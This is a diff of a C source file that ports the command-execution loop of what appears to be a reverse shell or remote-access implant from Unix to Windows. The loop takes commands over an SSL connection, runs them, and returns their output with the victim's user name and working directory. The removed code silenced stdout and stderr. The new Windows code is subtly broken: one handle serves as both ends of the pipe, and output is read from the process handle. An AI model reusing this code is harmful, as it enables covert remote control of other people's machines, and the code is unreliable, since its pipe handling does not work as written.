@@ -3,69 +3,95 @@
 #include <stdbool.h>
 #include <string.h>
 #include <openssl/ssl.h>
-#include <unistd.h>
-#include <limits.h>
-#include <errno.h>
-#include <fcntl.h>
+#include <windows.h>
+#include <lmcons.h>
 
-#include "send_receive.h"  
+#include "send_receive.h"
 
 #define SEP "<sep>"
 #define INITIAL_BUFFER_SIZE 4096
 #define BUFFER_INCREMENT 4096
 
-
 char* getuser() {
-    return "Unknown";
+    char username[UNLEN + 1];
+    DWORD username_len = UNLEN + 1;
+    if (GetUserName(username, &username_len)) {
+        return strdup(username);
+    } else {
+        return "Unknown";
+    }
 }
 
 char* getcwd_wrapper() {
-    return "Unknown";
+    char* buffer = (char*)malloc(MAX_PATH);
+    if (buffer != NULL) {
+        if (GetCurrentDirectory(MAX_PATH, buffer) != 0) {
+            return buffer;
+        } else {
+            free(buffer);
+            return NULL;
+        }
+    } else {
+        return NULL;
+    }
 }
 
 char* execute_command(char* command) {
-    FILE *command_pipe = popen(command, "r");
-    if (command_pipe != NULL) {
-        size_t buffer_size = INITIAL_BUFFER_SIZE;
-        char* buffer = (char*)malloc(buffer_size);
-        if (buffer != NULL) {
-            size_t total_bytes_read = 0;
-            size_t bytes_read;
-            while ((bytes_read = fread(buffer + total_bytes_read, 1, buffer_size - total_bytes_read, command_pipe)) > 0) {
-                total_bytes_read += bytes_read;
-                if (total_bytes_read >= buffer_size - 1) { // Check if buffer is full
-                    // Expand buffer
-                    buffer_size += BUFFER_INCREMENT;
-                    char* new_buffer = (char*)realloc(buffer, buffer_size);
-                    if (new_buffer == NULL) {
-                        free(buffer);
-                        pclose(command_pipe);
-                        return NULL; // Memory allocation failed
+    HANDLE command_pipe;
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    if (CreatePipe(&command_pipe, &command_pipe, &saAttr, 0)) {
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(STARTUPINFO));
+        si.cb = sizeof(STARTUPINFO);
+        si.hStdError = command_pipe;
+        si.hStdOutput = command_pipe;
+        si.dwFlags |= STARTF_USESTDHANDLES;
+
+        if (CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hThread);
+            CloseHandle(command_pipe);
+
+            size_t buffer_size = INITIAL_BUFFER_SIZE;
+            char* buffer = (char*)malloc(buffer_size);
+            if (buffer != NULL) {
+                DWORD total_bytes_read = 0;
+                DWORD bytes_read;
+                while (ReadFile(pi.hProcess, buffer + total_bytes_read, buffer_size - total_bytes_read, &bytes_read, NULL) && bytes_read > 0) {
+                    total_bytes_read += bytes_read;
+                    if (total_bytes_read >= buffer_size - 1) { // Check if buffer is full
+                        // Expand buffer
+                        buffer_size += BUFFER_INCREMENT;
+                        char* new_buffer = (char*)realloc(buffer, buffer_size);
+                        if (new_buffer == NULL) {
+                            free(buffer);
+                            CloseHandle(pi.hProcess);
+                            return NULL; // Memory allocation failed
+                        }
+                        buffer = new_buffer;
                     }
-                    buffer = new_buffer;
                 }
+                buffer[total_bytes_read] = '\0'; // Null-terminate the buffer
+                CloseHandle(pi.hProcess);
+                return buffer;
+            } else {
+                CloseHandle(pi.hProcess);
+                return NULL; // Memory allocation failed
             }
-            buffer[total_bytes_read] = '\0'; // Null-terminate the buffer
-            pclose(command_pipe);
-            return buffer;
         } else {
-            pclose(command_pipe);
-            return NULL; // Memory allocation failed
+            CloseHandle(command_pipe);
+            return NULL; // Failed to create process
         }
     } else {
-        char* error_message = strerror(errno);
-        if (strstr(error_message, "not found") != NULL) {
-            // Command not found error
-            return strdup("Command not found");
-        } else {
-            // Other errors
-            return strdup(error_message);
-        }
+        return NULL; // Failed to create pipe
     }
 }
 
 void shell(SSL* ssl) {
-    int stdout_backup, stderr_backup;
     char* username = getuser();
     char* cwd = getcwd_wrapper();
     if (username != NULL && cwd != NULL) {
@@ -84,22 +110,6 @@ void shell(SSL* ssl) {
         return;
     }
 
-    // Redirect stdout and stderr to /dev/null
-    int dev_null = open("/dev/null", O_WRONLY);
-    if (dev_null != -1) {
-        int stdout_backup = dup(STDOUT_FILENO);  
-        int stderr_backup = dup(STDERR_FILENO);  
-        
-        if ((dup2(dev_null, STDOUT_FILENO) == -1) || (dup2(dev_null, STDERR_FILENO) == -1)) { 
-            send_data(ssl, "ERROR<sep>Error Redirecting Output");
-            return;
-        }
-        
-        close(dev_null);
-    } else {
-        send_data(ssl, "Error Opening /dev/null");
-    }
-
     while (true) {
         char* recv_command = receive_data(ssl);
         char* command_result;
@@ -108,18 +118,20 @@ void shell(SSL* ssl) {
             break;
         }
         if (strncmp(recv_command, "cd ", 3) == 0) {
-        // Change directory
-            if (chdir(recv_command + 3) == 0) {
+            // Change directory
+            if (SetCurrentDirectory(recv_command + 3)) {
                 // Directory changed successfully
                 command_result = strdup("");
             } else {
                 // Error changing directory
-                char* error_message = strerror(errno);
+                DWORD error_code = GetLastError();
+                char error_message[256];
+                FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error_code, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, 256, NULL);
                 command_result = strdup(error_message);
             }
         } else {
-                 // Execute other commands
-                command_result = execute_command(recv_command);
+            // Execute other commands
+            command_result = execute_command(recv_command);
         }
         free(recv_command);
         if (command_result != NULL) {
@@ -139,16 +151,11 @@ void shell(SSL* ssl) {
             } else {
                 send_data(ssl, "ERROR<sep>Error Getting CWD");
                 return;
-
             }
             free(command_result);
         } else {
             send_data(ssl, "ERROR<sep>Error Executing Command");
             return;
-
         }
     }
-    // Restore stdout and stderr
-    dup2(stdout_backup, STDOUT_FILENO);
-    dup2(stderr_backup, STDERR_FILENO);
 }
